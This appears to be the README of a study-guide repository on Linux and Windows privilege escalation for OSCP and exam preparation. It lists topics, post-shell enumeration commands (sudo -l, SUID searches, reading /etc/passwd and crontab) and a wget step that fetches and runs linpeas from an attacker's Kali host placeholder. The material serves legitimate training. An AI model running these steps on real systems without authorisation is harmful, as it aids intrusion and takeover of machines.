# Previllage-Escalation# Privilege Escalation Notes — Complete Study Guide

> **Purpose:** Self-contained privilege escalation notes for NSDA exam, internship, and OSCP preparation.
> No external resources needed. Every concept, command, and technique is explained here.

---

## What is Privilege Escalation?

After getting initial access to a system (low-privilege shell), privilege escalation means finding a way to **gain higher privileges** — typically `root` on Linux or `SYSTEM/Administrator` on Windows.

```
Attack Flow:
Nmap Scan → Exploit Vulnerability → Low Shell → Privilege Escalation → Root/SYSTEM
```

You almost never land directly as root. Priv esc is what happens **after** you get in.

---

## 📁 File Structure

```
privellage-escalation/
│
├── README.md                          ← You are here (Start here)
│
├── linux-privesc/
│   ├── 01-suid-abuse.md
│   ├── 02-sudo-misconfiguration.md
│   ├── 03-cron-job-abuse.md
│   ├── 04-kernel-exploit.md
│   └── 05-weak-file-permissions.md
│
└── windows-privesc/
    ├── 01-token-impersonation.md
    ├── 02-unquoted-service-path.md
    └── 03-alwaysinstallelevated.md
```

---

## 🐧 Linux Privilege Escalation

| # | Topic | Difficulty | Importance |
|---|-------|------------|-----------------|
| 01 | [SUID Abuse](linux-privesc/01-suid-abuse.md) | Easy | 🔴 Must Know |
| 02 | [Sudo Misconfiguration](linux-privesc/02-sudo-misconfiguration.md) | Easy | 🔴 Must Know |
| 03 | [Cron Job Abuse](linux-privesc/03-cron-job-abuse.md) | Medium | 🔴 Must Know |
| 04 | [Kernel Exploit](linux-privesc/04-kernel-exploit.md) | Medium | 🔴 Must Know |
| 05 | [Weak File Permissions](linux-privesc/05-weak-file-permissions.md) | Easy | 🔴 Must Know |

---

## 🪟 Windows Privilege Escalation

| # | Topic | Difficulty | Importance |
|---|-------|------------|-----------------|
| 01 | [Token Impersonation](windows-privesc/01-token-impersonation.md) | Medium | 🔴 Must Know |
| 02 | [Unquoted Service Path](windows-privesc/02-unquoted-service-path.md) | Medium | 🔴 Must Know |
| 03 | [AlwaysInstallElevated](windows-privesc/03-alwaysinstallelevated.md) | Easy | 🟡 Important |

---

## 🛠️ First Thing To Do After Getting a Shell

Whenever you land on a system, run these commands **immediately** to understand your situation:

### On Linux:
```bash
id                          # Who am I? What groups am I in?
whoami                      # Current username
hostname                    # Machine name
uname -a                    # Kernel version (important for kernel exploits)
cat /etc/os-release         # OS version
cat /etc/passwd             # All users on the system
sudo -l                     # What can I run as sudo?
find / -perm -u=s 2>/dev/null   # All SUID binaries
cat /etc/crontab            # Scheduled jobs
```

### On Windows:
```cmd
whoami                      # Current user
whoami /priv                # What privileges do I have?
whoami /groups              # What groups am I in?
systeminfo                  # OS version, patch level
net users                   # All users
net localgroup administrators   # Who is admin?
```

---

## 📌 Quick Reference — Automated Tools

Instead of running all commands manually, these tools scan everything automatically:

| Tool | OS | Usage |
|------|----|-------|
| `linpeas.sh` | Linux | Automated Linux priv esc scanner |
| `winpeas.exe` | Windows | Automated Windows priv esc scanner |

### How to transfer linpeas to target:
```bash
# On your Kali machine — start a web server
python3 -m http.server 8080

# On the target machine — download and run
wget http://YOUR_KALI_IP:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

> **Note:** In exams, always run linpeas/winpeas first. Then manually exploit what it finds.

---

## Learning Order

```
Start Here:
01 SUID Abuse         → Easiest, most common in CTF/exam
02 Sudo Misconfig     → Very common in real world
03 Cron Job Abuse     → Medium, very satisfying to exploit
04 Weak Permissions   → Simple concept, quick win
05 Kernel Exploit     → You already saw this with udev
06 Token Impersonation (Windows) → Most important Windows technique
07 Unquoted Service Path (Windows)
08 AlwaysInstallElevated (Windows)
```
